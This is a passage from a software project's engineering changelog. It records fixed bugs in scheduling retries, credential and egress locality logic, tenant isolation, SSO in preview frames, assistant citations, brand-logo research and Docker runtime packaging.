  **Correcting the report that raised this**: the copy is NOT dead, which is why the alternative
  disposition ("drop it") was wrong - it is reached today through the integration-action rail. FIXED
  by including the status. The ceiling is unaffected: `awaiting_consent` is deliberately NOT in
  `NEUTRAL_BLOCKED_CODES`, so it still counts and still auto-pauses.

- `getBrowser-guarded-on-a-condition-that-could-not-occur` (dead surface, removed). `if (connection
  && stepLocality?.kind !== 'in-process')` - `resolveLocality` answers `bridge` or `blocked` whenever
  `daemonConnected` is true, and `daemonConnected` IS `!!connection`, so a truthy `connection` and an
  `in-process` verdict cannot co-occur and the conjunct was never enterable. The docblock directly
  above it argues against exactly this ("an unpinnable guard reads as protection while providing
  none"). Removed; provably equivalent, so no test changes.

- `hostedTypistPermitForPortal-documented-a-branch-its-caller-cannot-reach` (docblock defect, fixed).
  `classifyOrigin(baseUrl)` is called with NO action, and `classifyOrigin` returns the frozen CLOSED
  classification before it looks at the url whenever `!action` - so `cloudEgressAllowed` is false for
  every input and the `{ hostedTypist: {} }` branch is unreachable from this caller. The docblock
  claimed the permit "becomes an ordinary YES the moment the sync is promoted onto a declared
  integration action", which is false as written: declaring an action changes nothing while the call
  site passes none. Corrected to say what it is (a constant NO), what would actually change it
  (passing the action here), and why the call stays rather than collapsing to a literal (posture is
  `origin-posture.ts`'s question; a literal is this rail deciding its own posture again, rule 3). The
  contract test asserting the permit is absent is now annotated as asserting a CONSTANT, with what it
  does pin - the wiring - said out loud.

## Recently fixed - 2026-08-19 an empty fleet was ignorance, so a solo tenant retried forever (round six)

Round five made the P4.2 slice reachable. Round six closes the regression that reachability exposed,
plus four pieces of surface that were reachable only from a test. Each behaviour change is pinned by
a test verified to fail against the unfixed source.

- `an-org-whose-only-machine-is-revoked-retried-forever` (**MAJOR**, a regression this branch
  introduced and did not ship). A solo tenant pairs ONE laptop, holds an attended ceremony on it,
  then revokes the pairing without replacing it. `egressCandidatesForOrg` filters `revokedAt: null`,
  so the org's fleet listing is genuinely `[]` - and `[]` was read as "this process does not know
  what this org has". `machineRetired` therefore answered NO, so NEITHER retirement branch fired
  (`credentialGateRecord`'s, and `resolveLocality`'s); with no daemon connected the run halted
  `awaiting_daemon`, which THIS BRANCH newly made NEUTRAL against the failure ceiling
  (`NEUTRAL_BLOCKED_CODES`); and the schedule re-fired nightly, forever, uncounted, telling the owner
  to connect a machine that no longer existed.
  On `main` the same case mapped to `failed` and auto-paused after 20 fires with `autoPausedAt` shown
  in the UI. The branch converted a BOUNDED dead end into an UNBOUNDED one - the exact pathology its
  own retirement fix was written to remove, re-created for the tenant least equipped to notice.
  ALSO WORTH RECORDING: the reviewer's suggested mechanism alone would not have fixed it. Making
  `machineRetired` answer YES for `[]` repairs `credentialGateRecord`'s branch, but that branch is
  never reached in this scenario - with no daemon connected `resolveLocality` refuses BEFORE the
  credential gate runs (`localityRecord ? {} : await credentialGateRecord(...)`), so the fix had to
  reach `resolveLocality` too. The code won that argument.
  FIXED, in three places that had to move together:
  (a) `EgressCandidateResolver` (`automation/seams.ts`) now answers `EgressCandidate[] | null`, and
  the UNBOUND default is `null`. `null` = no listing, `[]` = the registry says this org has no
  machines. A store error still THROWS rather than answering `null`, because a throw is a terminal
  run failure and therefore bounded, where `null` would restore the unbounded neutral wait.
  (b) `machineRetired` takes `readonly string[] | null`: `null` answers NO (not-knowing may never
  escalate), `[]` answers YES (every pairing is gone from a fleet with nothing in it).
  (c) `resolveLocality` gains the branch that matches the case: with no daemon connected and a
  KNOWN-EMPTY listing, a refusal that would have said "start your machine" says
  `NO_MACHINE_IN_ACCOUNT_REASON` instead and answers `clearedBy: 'pair-a-machine'`, which is
  terminal. The engine turns that into the ceremony halt when the step DECLARES a credential (the
  solo-tenant case: pair a machine, then establish the session) and into a plain non-recoverable
  failure when it does not - a credential ask for a step that wants none is a wrong specific
  instruction, which is worse than an honest general one.
  `clearedBy` was renamed from `'machine' | 'human'` to `'start-a-machine' | 'pair-a-machine'`,
  because its one consumer has to pick a halt with it and "a person must do something" was never
  enough to pick one.
  MUTATIONS, all verified red: `null`->`[]` on the unbound default, `[]`->NO on `machineRetired`,
  and deleting the `resolveLocality` branch.

- `resolveLocality-carried-a-retirement-branch-nothing-could-reach` (dead surface, removed). Round
  three's `preferenceMachineRetired` was unreachable in production and its own suite was the only
  caller. A preference is LEARNED only from a checkout that SUCCEEDED, and `bridge/attended.ts` -
  the single writer of `establishedBy: { kind: 'machine' }` - always stamps
  `boundEgress: { kind: 'residential', pairingId }` from the same id, so a successful checkout proves
  the machine is in the fleet listing and `machineRetired` cannot be true of it. Round five had
  already moved the live refusal one step earlier, into `credentialGateRecord`. REMOVED, together
  with the case that pinned it; `SESSION_MACHINE_RETIRED_REASON` moved to `egress-policy.ts`, beside
  the predicate whose `true` produces it and next to its one remaining caller.

- `establishedByPairingId-on-a-fresh-capture-was-unreachable` (dead surface + a dishonest fixture).
  `EnsureSessionResult.reestablished` carried the field, read off `EnsureSessionInput.vantage`. That
  input has NO production supplier - the default is cloud/datacenter - and it cannot get one while
  the typist is hosted: `establishWithTypist` logs in through `getLocalBrowserContext`, i.e. this
  process's Chromium, which is on no machine. The test asserting it hand-built the vantage, so it
  proved the branch compiled and nothing else - the same fixture-honesty failure round five closed
  twice over. REMOVED from the result type and the return; the case now drives the REAL typist and
  asserts the honest negative. `credential-gate.ts` reads the pairing from `reused` only.

- `schedule_blocked-was-emitted-into-a-channel-with-no-listener` (dead signal). The supervisor
  notifies the owner on every blocked fire, and it exists precisely because the ENVIRONMENT block is
  neutral against the ceiling: it never auto-pauses and announces itself no other way. Nothing in
  `web/` subscribed - no `notifications.on('schedule_blocked', ...)` anywhere - so the compensating
  signal reached nobody. FIXED: the schedules list page subscribes, toasts the CAUSE's words (derived
  from the code, never server prose, falling back to the general blocked label), and refetches so the
  row's badge stops showing the previous outcome. Pinned in
  `web/__tests__/components/schedules-page.test.tsx` on rendered text, not on a subscription
  existing.

- `resolveEgress-tenancy-filter-degraded-to-pairing-id-membership` (Rule 5). Extracting
  `residentialEgressPairings` left `resolveEgress` narrowing its ROWS by a set of pairing IDS:
  `candidates.filter((c) => available.has(c.pairingId) && ...)`. That is only as strong as the
  assumption that a pairing id identifies at most one row, and a tenancy boundary must not rest on an
  id being unique across tenants - `registerPairing` is reachable by two orgs and nothing enforces
  global uniqueness. A foreign row sharing one of our ids, listed first, becomes `usable[0]` and its
  tailnet address becomes the run's proxy: one tenant's portal traffic leaving through another
  tenant's house. FIXED: `c.org === actorOrg` restored on the row filter. Pinned in
  `api/tests/security/locality-isolation.test.ts` with a deliberately colliding id.

- `citius-sync-hard-coded-an-open-hosted-typist-permit` (Rule 3). The rail wrote
  `hostedTypist: {}` into its `ensureSession` call unconditionally, making it the one consumer in the
  repo able to type a lawyer's court password into the hosted Chromium, from a datacenter IP, for an
  origin nobody had classified. FIXED: the permit is an INPUT (`CitiusSyncInput.hostedTypist`,
  absent-means-no) composed at the rail's composition point (`routes/sync.ts`) from `classifyOrigin`,
  exactly as the run loop composes it. The sync drives a hard-coded portal walk rather than a declared
  `IntegrationAction`, so nothing declares it permissive and the answer today is a permit WITHHELD -
  the typist route becomes `needs-human` and a person establishes the session on a machine of their
  own, which is the correct closed reading for a court portal. It becomes an ordinary yes the moment
  the sync is promoted onto a declared action. Pinned on the input the rail actually received
  (`api/tests/contract/citius-sync.test.ts`).

## Recently fixed - 2026-08-19 P4.2 was dead code in production (round five)

Round four's verifier found that the ENTIRE P4.2 ceremony-preference path was unreachable in the
shipped product, and that the reason it was invisible was the fixtures. Both halves are closed here,
each pinned by a test verified to fail against the unfixed source.

- `run-loop-never-supplied-residentialAvailable` (**MAJOR**). The engine called
  `credentialGateRecord({actor, runId, automationName, steps, index, hostedBrowser})` and never
  passed `residentialAvailable`, so `evaluateCredentialGate` forwarded nothing, `ensureSession`
  handed `checkoutSession` an empty list, and checkout refused **every attended session there is**
  with `egress-unavailable`. `bridge/attended.ts` is the only production writer of
  `establishedBy: { kind: 'machine' }` and it always stamps `boundEgress: { kind: 'residential',
  pairingId }` beside it, so the refusal was universal for card-established sessions.
  TWO CONSEQUENCES, both real: (a) an attended card-login session could NEVER be reused by an
  automation, and the halt was `awaiting_daemon`, which is in `NEUTRAL_BLOCKED_CODES` - so the
  schedule re-fired forever, uncounted, with nothing the owner could do; the same unbounded-retry
  pathology this branch's retirement fix exists to remove, arriving by another route. (b)
  `verdict.status === 'reused'` was never reached for a machine-established session, so
  `establishedByPairingId` -> `preferredPairing` was never emitted and no P4.2 code ever ran.
  FIXED: the run loop already loads the org fleet into `egressCandidates`; it now derives the list
  through `residentialEgressPairings` (`automation/egress-policy.ts`), the SAME predicate
  `resolveEgress` uses - so "this machine can carry the work" and "this machine's session may be
  released" cannot drift apart. Tenancy pinned in `api/tests/security/locality-isolation.test.ts`
  (a foreign pairing in that list would let one tenant unwrap a session bound to another's house).
  MUTATION: dropping the argument reddens 10 cases in `engine-locality.test.ts`.

- `every-P4.2-fixture-stamped-a-session-production-cannot-emit` (**MAJOR**, and the reason the above
  was invisible). All four engine fixtures and the unit fixture paired
  `establishedBy: { kind: 'machine' }` with `boundEgress: { kind: 'datacenter' }`, under a comment
  saying that kept checkout out of the way. No code path in this repo produces machine+datacenter:
  the hosted typist writes `cloud`+`datacenter`, the ceremony writes `machine`+`residential`, and
  `EstablishmentVantage` (the only other way to reach the field) has NO production producer at all.
  The suite therefore exercised a variant the product cannot emit while the one it does emit halted
  at the gate. FIXED: every fixture now carries the shape `attended.ts` writes.

- `the-retirement-branch-was-unreachable-for-the-same-reason` (found while repairing the fixtures,
  deeper than the report that prompted it). Because a ceremony session is bound to its machine's
  residential line, REVOKING that machine makes checkout refuse the session outright - so the run
  never learns the ceremony pairing, and `resolveLocality`'s retirement branch (round three's fix
  for exactly this dead end) could not fire in production either. The unbounded retry it was written
  to remove was still there, one step earlier.
  FIXED: `credentialGateRecord` now asks the fleet listing whether the machine checkout named is
  GONE or merely asleep, through the same `machineRetired` predicate `preferenceMachineRetired`
  uses, and produces the identical `needs_credentials` ceremony halt via the shared
  `SESSION_MACHINE_RETIRED_REASON`. An EMPTY listing still reads as NOT retired - the closed
  direction, so an unbound seam can never escalate a neutral wait into a terminal halt.
  The gate carries `origin` and `requiredPairingId` as FACTS rather than folded into prose, because
  the fleet listing lives in the engine and not in the gate.
  MUTATION: disabling the branch reddens 4 cases.

- `two unpinned engine guards` - both mutable to no effect before this round.
  `localityRecord ? {} : await credentialGateRecord(...)`: removing the guard left every suite green
  because the refusal record still wins the `??` chain, so status, halt and message are identical
  either way. What changes is what the gate DOES on the way to an answer nobody asked for - it
  decrypts the credential for a step that will never run and, on a route-switch refusal, opens the
  hosted browser and types the password out of a door no work in the run is using. Pinned by
  "a step locality already refused never reaches the credential gate, so no second door opens",
  whose observable is a SECOND browser context (mutation: 1 -> 2).
  `stepLocality = null`: deleting it let a non-browser step inherit the previous BROWSER step's
  verdict and compute its typist permit from a decision about a different origin. Pinned by "a step
  with no locality of its own does not inherit the last browser step's door" (mutation: the login
  for portal B leaves through `pair_home`, the machine resolved for portal A's step).

## Recently fixed - 2026-08-18 schedules adversarial review (15 confirmed, all closed by test)

The schedules feature (5a5e721) was merged to `main` under the review gate the QA process requires.
A four-lens adversarial review (tenancy/auth, supervisor correctness, wire contract, web surface)
raised 23 findings; each was handed to an independent verifier prompted to REFUTE it. **8 were
refuted** (recorded below as dismissals), **15 were confirmed** and are all now fixed, every one
pinned by a test verified to fail before the fix and pass after.

**Supervisor (`api/src/schedules/supervisor.ts`).**
- `schedules-slow-fire-starves-due-tail` - the tick blocked at the concurrency gate
  (`while (inFlight.size >= max) await Promise.race(...)`), so a few slow fires stalled the due
  list until its tail aged past the 5-minute grace and was skipped outright. The blocking wait is
  gone: a schedule that finds no free slot is deferred to the next tick, and the staleness verdict
  is now judged against `firstSeenDue(scheduleId, plannedFor)` - the instant this process first saw
  the occurrence due - so the supervisor's own queueing can never convert a live occurrence into a
  skipped one.
- `schedules-stale-recovery-crawls` - stale recovery advanced the pointer by ONE occurrence per
  tick, so a 5-minute schedule stayed silent for hours after a short outage while it walked
  forward. `advance()` now takes `adoptFromMs` on the stale path and lands on the first occurrence
  at or after now in one step.
- `schedules-missed-once-vanishes` - a `once` schedule whose instant passed while the process was
  down hit the stale branch and was dropped with no run row and no user-visible trace. It now goes
  through `recordMissedOccurrence()` under the SAME deterministic `occurrenceRunId` claim (so
  at-most-once still holds across processes), writing a terminal row with `detail.code: 'missed'`
  and no `firedAt`. No `shared/` change: the existing `failed` status plus a code is exactly the
  designed vocabulary ("user-facing text derives from the CODE, never from server prose").
- `schedules-fire-escapes-shutdown` - `stop()` spread `inFlight` ONCE, so a fire launched by an
  in-flight tick after that snapshot escaped, leaving a claimed occurrence stuck `running` forever
  (the deterministic claim makes it permanent). `ticking` is now the pass promise, `stop()` drains
  in a loop, and `claimAndFire` re-checks the generation immediately before the claim insert.

**Wire contract.**
- `schedules-runs-status-filter-dropped` - `GET /api/v1/schedules/:id/runs` DECLARED a `status`
  query filter and silently forwarded only `limit`, so a client filtering by status got unfiltered
  rows and could not tell. Honoured end to end now (route -> service -> store), with the limit
  capping the filtered set.
- `schedules-preview-has-no-anchor` - `SchedulePreviewRequest` was `{spec, count}`, so
  `previewSpec` always anchored on the REQUEST INSTANT while the supervisor anchors on the
  schedule's `createdAt`. The edit dialog therefore previewed occurrence times the supervisor would
  not fire. Additive fix: optional `scheduleId`, anchor read from the STORE (never from the body -
  a caller-chosen anchor would be a second source of occurrence truth), landed with its contract
  test, OpenAPI regen and client regen in the same unit.

**Rule 5 regression-guard gap.**
- `schedules-list-owner-filter-untested` - the isolation suite's header claimed "list surfaces
  never leak" and that coverage did not exist. Every peer probe hit item-level routes guarded by
  `canSeeSchedule`/`getSchedule`; nothing exercised the owner narrowing in `listSchedules`
  (`store.ts:80`) or `listRunsForActor` (`store.ts:189`). **Proof it mattered:** deleting both lines
  left the whole suite green while every plain user in an org gained read access to every
  colleague's schedules and runs, including `target.instructions` free text. The shipped code was
  always correct - this was a missing guard, not a live hole. Closed by a test that asserts
  "mine, and only mine" on both collection surfaces with the victim's specific ids, verified to
  fail with either narrowing line removed independently.

**Web surface - the UI lying when something fails.** All five error-handling defects shared one
root cause: the store had a single `error` field that no page read. Split into `loadError` (a
broken READ) and `error` (a refused ACTION).
- A failed list fetch rendered the "no schedules yet" EMPTY state - telling the user their data
  does not exist. Now an error card with retry; the empty state is gated on the list having
  actually arrived.
- Every mutation failure was silent (toggle snapped back, delete/run-now/complete failed
  invisibly). Now reported through the same toast channel `integrations/page.tsx` uses.
- The detail page reported "schedule not found" for a 500, a 403 and a network loss alike. Now only
  a 404 reads as absent.
- Run history spun forever when its fetch failed (`runs === undefined` assumed only two states).
- Org-admins see the whole org's schedules (deliberate) but may only mutate their own, so every
  mutating control shown on a peer's row was guaranteed to 404. New `web/lib/schedules/authority.ts`
  `canActOnOwned` mirrors the server's `canEditSchedule`; rows stay readable without fake controls.
- Rows were mouse-only (a `Card` div with `onClick`): now a real link with a stretched overlay, so
  keyboard and AT reach it as a link. Form validation errors moved out of the scrolling body into
  the fixed footer beside the submit button, where they are visible at the moment of submission.

**Dismissed (verifier refuted, no change made).** Run failure codes rendered untranslated (the
code-not-prose rule is deliberate and pinned by the `run-error-text-leak` fix above); em dashes in
the e2e spec (comments only, not authored user-facing content); `every:'week'` above ~157 answering
null (schema allows 999, but the search horizon is a deliberate bound and the refusal is explicit,
not silent); the CAS mutator writing on an authorization refusal (no cross-tenant effect - the
mutator returns `cur` unchanged and the write is a no-op rewrite); preview timezone presentation;
the e2e preview assertion's looseness; and run-now touching `consecutiveFailures` (a docstring
wording nit - the ceiling state it produces is intended).

## Recently fixed - 2026-08-15 a cancelled framed sign-in left the app hung (own regression)

**`framed-sso-never-settles`** (found by driving the REAL customer ERP login framed with the
first version of the popup fix below; a regression that fix introduced). Removing the frame
navigation removed the only signal an app had that sign-in had ended. Measured: click
"Continuar com Microsoft 365", close the popup, and the button stays `disabled` with its
spinner animating **forever** - the ERP does `setMsLoading(true)` on click and nothing clears
it, which was invisible while the frame navigated away. Every already-built bundle has the
same shape, so no app-side change reaches them. **Fixed** in the runtime (decision entry
2026-08-15): `signIn()` returns `Promise<boolean>` and both outcomes dispatch a cancelable
`ekoa:sso-complete` / `ekoa:sso-cancelled` event, then reload the frame unless a listener
calls `preventDefault()`; a still-open popup past the watcher budget stops without reloading.
Side benefit, verified in the same pass: the reload revived the ERP's own `erp_sso_pending`
path, so a cancelled/failed SSO now renders its intended PT-PT message instead of nothing.
Closed by: `api/tests/contract/served-app.test.ts` (settle strings) + a third test in
`web/e2e/app-sso-frame.spec.ts` - green against the fixed runtime, failing against the old
one. Still OPEN and app-side, recorded here rather than silently fixed: submitting the ERP
login with BOTH fields empty fires a doomed `POST /api/app-sso/login` (400) and reports
"E-mail ou palavra-passe incorretos." instead of asking the user to fill the fields; that is
a change to the customer's artifact source, not to this repo.

## Recently fixed - 2026-08-15 preview frame rendered "refused to connect" on Microsoft sign-in

**`preview-frame-sso-refused`** (found live by the owner on the tailnet dev stack: the builder
side-panel's Pré-visualização of the imported salomao ERP showed "dev-madrid.tail31efa.ts.net
refused to connect"; ask recorded as "we should allow new windows and pop ups on the preview
frame"). Root cause reproduced E2E before touching code: the ERP's "Continuar com Microsoft 365"
calls the injected `__ekoa.signIn()`, which `location.assign`ed the IFRAME to
`/api/app-sso/microsoft/start` - an /api-surface URL served with `X-Frame-Options: DENY` +
`frame-ancestors 'none'` (security-headers.ts, correct and unchanged), and the provider's own
login page refuses framing too. So in-frame SSO can never render; the panel showed Chrome's
refusal instead. NOT a frame-ancestors misconfiguration: `/apps/*` framed fine throughout (the
2026-08-07 tailnet CSP finding stayed fixed). **Fixed** by making the injected runtime
frame-aware (decision entry 2026-08-15): framed `signIn()` opens the start URL in a named
top-level window (`'__ekoa_sso_'+appId`) and polls the quiet `/api/app-sso/session` probe
against a popup-open baseline, reloading the frame only on a session CHANGE; the popup, when
the callback returns it to `/apps/<id>/<return>`, detects the marker name + same-origin framed
opener, reloads that frame and closes itself; a BLOCKED popup leaves the frame alone with a
console warning; top-level keeps the unchanged `location.assign`. Closed by:
`api/tests/contract/served-app.test.ts` (frame-aware signIn strings) +
`web/e2e/app-sso-frame.spec.ts` (ledgered same change; verified green against a scratch --built
stack AND verified to fail against the pre-change runtime). Residual, deliberate: the LIVE dev
stack keeps serving the old dist until its next restart - restarting it here would have wiped
the ephemeral Mongo holding the verified salomao import; and dev answers the start leg 503
(Microsoft SSO env not configured), which now renders in the popup instead of killing the frame.

## Recently fixed - 2026-08-13 "Usar" opened an unshared artifact's dead 410 link

**`usar-opens-revoked-link`** (found during the live verification of the assistant-overhaul batch:
the artifacts page's primary "Usar" action on a freshly built app opened
`/apps/<slug>/` bare, which answers 410 "Link já não disponível - O autor revogou a partilha").
`getArtifactAppUrl` (web/components/artifacts/artifacts-surface.tsx) never attached the owner
preview token, so the dashboard's own primary action was dead for every artifact the owner had
not explicitly shared - which is every fresh build. **Fixed**: an unshared artifact routes
through `api.withPreviewToken` (Q-05: owner-checked, non-shareable previews only); a SHAREABLE
artifact keeps the bare link, because a copied share URL must never carry the owner's JWT.
Closed by: `web/__tests__/lib/artifact-app-url.test.ts` (ledgered same change). Also fixed in
passing, both pre-existing red on clean `main`: `tests/automation/engine.test.ts` pinned the
English word "approval" on a terminal frame that now carries PT-PT product copy (the pin moved to
the PT copy; the internal-record assertion already covered the English form), and
`docs/CONVERGENCE_AUDIT.md` cited `garrison:compositions/dogfood-orch/apm.yml`, which no longer
exists (the composition ships no apm.yml; the sentence now states current reality and the citation
gate is green).

## Recently fixed - 2026-08-13 assistant citations were retrieval hits, not citations

**`assistant-citations-not-citations`** (found live by the owner: a plain todo-list app's
"Dê-me uma visão geral da aplicação" answered with 5 "Fontes" under the label "jurisprudencia",
none of them used by the answer). Three stacked defects: (1) `app-assistant.ts` mapped EVERY
retrieval hit to a citation BEFORE the model ran and returned them unconditionally; (2) retrieval
always searched the `_shared` legal corpus (198k docs here) with no relevance threshold and a
1.25x authority boost for legal collections; (3) `toMatchQuery` checked stopwords BEFORE accent
folding, so "dê" sailed past the list and the index's `remove_diacritics 2` tokenizer matched it
against every "de" in the corpus - virtually the whole corpus matched and BM25 picked 5.
**Fixed** by three layers: fold-before-stopword (+ pronoun/filler stopwords), the shared corpus
joins grounding only on a legal-context query (org vault always searched;
`search(..., { includeShared })`), and citations are now USED-ONLY (numbered excerpts; the reply's
`[n]` references select which hits are cited; no reference = no Fontes). Closed by:
`tests/knowledge/index-store.test.ts`, `tests/knowledge/grounding.test.ts`,
`tests/apps/app-assistant.test.ts`. Decision entry: 2026-08-13 batch, items 1-2.

## Recently fixed - 2026-08-13 the brand chain to built apps was dead end-to-end

**`brand-chain-dead-end-to-end`** (found while investigating "the app looks generic and has no
logo" - the org had a COMPLETE researched brand two minutes before the build). Four breaks, each
alone fatal: (1) the served app document linked `/api/design-tokens.css` bare, and the api stamps
`Referrer-Policy: no-referrer` on every response, so `appIdFromRequest` could never resolve an org
in a REAL browser - every app always received the platform-default teal (live-verified by curl);
(2) even resolved, the logo token emitted `url("/brand-assets//brand-assets/x.png")` (double
prefix, 404); (3) researched `fonts[]` were never mapped to the font tokens, and nothing populates
`logoIcon` - the FIRST token the app shell checks; (4) the first-build prompt carried zero brand,
and the house style defaults to a light background, so a dark-brand org got a light generic app by
construction. **Fixed**: `?app={{APP_ID}}` on the tokens link (+ injection into agent-authored
plain-HTML heads), `Referrer-Policy: same-origin` on the /apps DOCUMENT surface only, the
already-rooted asset path taken as-is, fonts[] mapped, `--logo-icon-url` falls back to the logo,
the neutral layer derives from the org's extracted canvas (WCAG-derived hover/on-primary; dark
brand = dark app), and `prepareFirstBuild` appends a compact org-brand prompt section
(`apps/brand-prompt.ts`). Closed by: `tests/legal/design-tokens.test.ts`,
`tests/apps/builder.test.ts`, `tests/apps/build-mechanics.test.ts`,
`tests/apps/brand-prompt.test.ts`, `tests/security-headers.test.ts`. Decision entry: 2026-08-13
batch, item 6. The gate-class lesson (a resolution path only exercisable with a hand-set header is
a green gate proving nothing) is why the new design-tokens test fetches exactly as a browser does.

## Recently fixed - 2026-08-13 an overload-killed first build was terminal and lost its tier

**`first-build-overload-terminal`** (the "20-minute todo app", measured from the dev Mongo: 4m20s
GENIUS attempt killed by API 529 after 4m10s of INVISIBLE Agent SDK internal retries + 8m13s of
human reaction time + a 6m55s successful manual retry that - because the failed build had already
created the artifact - routed as a FOLLOW-UP at EXPERT, silently dropping the GENIUS first-build
directive). ADAPTER_ERROR was "retryable" in name only: nothing in the pipeline retried. **Fixed**
by the in-job overload retry + first-event deadline (decision entry 2026-08-13 item 3). Closed by:
`tests/agents/build.test.ts` "overload resilience" (5 cases incl. the never-retry guards).

## Recently fixed - 2026-08-13 the guided tour highlighted content hidden behind the panel

**`panel-overlay-occludes-app`** (found live: Tutorial guiado step 5 pointed at the history list
while the fixed 380px panel covered it; the ring overlay also out-z-indexed the panel, greying the
tour's own Seguinte/Sair controls). The panel was a pure overlay - nothing reserved layout space -
and the C3 ring overlay knew nothing about it. **Fixed**: the open panel stamps
`<html data-ekoa-assistant-open>` and the injected CSS reserves a matching body margin on >900px
viewports (overlay below; full-width at <=480px), so the app reflows; the ring overlay moved BELOW
the panel in the z-contract, clamps its tooltip to the visible width, and follows reflows via a
body ResizeObserver. Plus the two missing panel affordances: a visible pending bubble while a turn
is in flight, and "Nova conversa" back to the suggestions state (generation-guarded abort-safe
reset). Closed by: `tests/apps/assistant-panel.test.ts`, `tests/apps/tour-player.test.ts`.
Decision entry: 2026-08-13 batch, items 4-5.

## Recently fixed - 2026-08-07 brand research stored the og:image banner as the logo

- **`brand-logo-og-banner`** (medium, product). Brand research on `https://ekoa.io/info`
  filled `branding.logo` with the site's 1200x630 og:image social card instead of the logo -
  the dual light/dark preview then showed the banner twice on `/settings/branding`. Two runs
  minutes apart gave different logos ("earlier today it worked"): the ONE best-effort vision
  call was the only thing standing between the banner and the logo slot. Root chain, proven
  live: (1) the rendered-header harvest proposed the REAL logo
  (`/assets/ekoa_logo.png`, walk score 125) but the site serves it as a 4.5MB 2048x2048 PNG
  and the flat 1.5MB download cap silently dropped it; (2) the static-HTML fallback scan
  looked only at the first 30% of the HTML and the header `<img>` sits at 41%; (3) the
  surviving candidates were dembrandt's favicon list - the real 256x256 icon and the og
  banner, BOTH labelled `favicon`, so the og-image tier demotion never applied and the
  "bigger file wins" tie-break crowned the banner; (4) the vision gate picked the icon in one
  run and the banner in the next (the banner contains the header lockup, so a FAST-tier
  match is a coin flip). **Fix** (`services/branding/image-fit.ts` + `brand-assets.ts` +
  `logo-vision.ts`): oversized rasters are downscale-rescued via sharp (12MB source cap,
  stored bounded to 1024px/1.5MB) instead of dropped; every stored candidate gets probed
  dimensions; the social-card shape is flagged `banner` and demoted below every source tier;
  a candidate matching the site's og:image URL is force-labelled `og-image` whatever route
  proposed it; the HTML scan cutoff widened to 60%; the vision prompt states a social card is
  never the logo, receives per-candidate dimensions, always logs its verdict, and a
  banner-shaped vision pick is refused while any non-banner candidate exists. Pinned by
  `api/tests/services/branding/image-fit.test.ts` + new `selectBestLogo` cases. Verified
  live: re-research of ekoa.io/info stores the real mark deterministically.

## Recently fixed - 2026-08-07 tailnet-bound dev stack: preview iframe CSP-blocked

- **`tailnet-preview-frame-ancestors`** (low, dev-harness). A stack booted for another device
  (`EKOA_PUBLIC_WEB_HOST`, e.g. a tailscale hostname — the phone-driving setup) served the
  dashboard from that origin, but the api's `/apps/*` `frame-ancestors` allowlist
  (`security-headers.ts` `dashboardOrigins()`) still defaulted to `http://localhost:3000`, so
  the artifact preview iframe was CSP-blocked with only a browser console line
  (`Framing 'http://…:4111/' violates … frame-ancestors`) to show for it. Found live 2026-08-07
  while verifying Conduzir/steer over the tailnet. **Fix:** the driver
  (`.claude/skills/run-ekoa-code/driver.mjs` bootApi) now derives
  `EKOA_DASHBOARD_ORIGINS=http://localhost:<web-port>,http://<public-host>:<web-port>` whenever
  `EKOA_PUBLIC_WEB_HOST` is set and no explicit allowlist was given — the api's existing env
  contract, just plumbed; localhost stays so a local browser keeps working. Verified live:
  the header now names both origins and the preview renders over the tailnet.

## Recently fixed - 2026-07-15 api runtime image defects (staging bring-up)

Three defects in the shipped api image, all of the same class - **the image builds fine but the
process fails at runtime** - all invisible to the dry-run deploy CI because that lane only *builds*
the images, never *runs* them. The first two crash at boot and were caught by a local full-stack
smoke (Caddy + api + web + mongo) before any VM spend; the third only surfaces on the first real
model turn (needs a live credential) and was caught on staging.

- **`api-phantom-dep-js-yaml`** (medium, packaging). The api imports `js-yaml` in three runtime paths
  (`automation/manifest-parser.ts`, `apps/action-manifest.ts`, `apps/tour-writer.ts`) but it was
  declared **nowhere** in `api/package.json` / root `package.json`. It only resolved because ESLint (a
  devDep) transitively hoists `js-yaml@4.3.0` to the root `node_modules`; the runtime image
  (`npm ci --omit=dev`) drops it, so `node api/dist/server.js` crashed with
  `ERR_MODULE_NOT_FOUND: Cannot find package 'js-yaml'`. **Fix:** added `js-yaml@^4.3.0` to api deps +
  `@types/js-yaml@^4.0.9` to api devDeps, and deleted the ambient shim `api/src/automation/vendor.d.ts`
  (whose own comment prescribed exactly this). A scan of the built `api/dist` against the prod-only
  dependency closure confirmed js-yaml was the **only** phantom dep.
- **`api-image-native-build-skipped`** (medium, packaging). With js-yaml fixed the api then crashed in
  `bootState` -> `backfillKnowledgeIndex` with `Could not locate the bindings file ... better_sqlite3.node`.
  `Dockerfile.api` ran `npm ci --omit=dev --ignore-scripts`, and `--ignore-scripts` skips native
  addons' install step; `better-sqlite3@12.11.1` ships **no prebuilt** for node 20 (so it must compile
  via node-gyp, which the slim image has no toolchain for). **Fix:** restructured `Dockerfile.api` with
  a dedicated `proddeps` stage that has `python3/make/g++`, installs prod deps `--ignore-scripts`, then
  `npm rebuild better-sqlite3` (compiles it); the slim runtime `COPY --from=proddeps node_modules`, so
  the toolchain never ships. Other native modules (`sharp`, `onnxruntime-node`, `@next/swc`) use
  prebuilt platform packages and were unaffected. Verified: api boots, `/health` 200, real admin login
  through the same-origin Caddy proxy, and `chromium.launch()` succeeds inside the container.
- **`api-sdk-musl-binary-picked`** (medium, packaging; surfaced by the first live model turn on
  staging). With the model credential armed, chat/build died with
  `ADAPTER_ERROR: Claude Code native binary not found at .../claude-agent-sdk-linux-x64-musl/claude`.
  `@anthropic-ai/claude-agent-sdk` ships its native `claude` binary as per-platform optional deps; npm
  installs BOTH `linux-x64` (glibc) and `linux-x64-musl` on any linux-x64 host (it filters optionals by
  os+cpu, not libc), and the SDK's resolver tries the **-musl variant first** - which cannot exec on the
  glibc bookworm image. **Fix:** `Dockerfile.api` proddeps stage now `rm -rf`s the `*-musl` variant
  packages so the resolver falls through to the working glibc binary. Verified on staging: a real chat
  turn returns `status:complete` (`"OK."`, ~4.7s) through the OAuth subscription credential + egress
  chokepoint. Note this class is invisible even to a boot smoke - a full check needs a live credential
  and one model turn.

Follow-up (recommended, not done here): add a container **boot smoke** to `deploy.yml` (run the api
image against a throwaway mongo, assert `/health` 200) so this whole class - a runtime import or native
binary absent from the shipped image - fails CI instead of first appearing on a server.

## Recently fixed - 2026-07-16 staging edge-proxy path allowlist incomplete

- **`staging-caddy-api-path-allowlist-incomplete`** (HIGH, deploy config; caught by the staging UI pass).
  The staging Caddyfile `@api` matcher routed only `/api/* /health /hooks` to the api container and sent
  **everything else** to Next (web). But the api owns a whole set of NON-`/api` browser-facing prefixes -
  the served-app pipeline `/apps/*` (the live build-**preview** iframe) and its injected runtime scripts
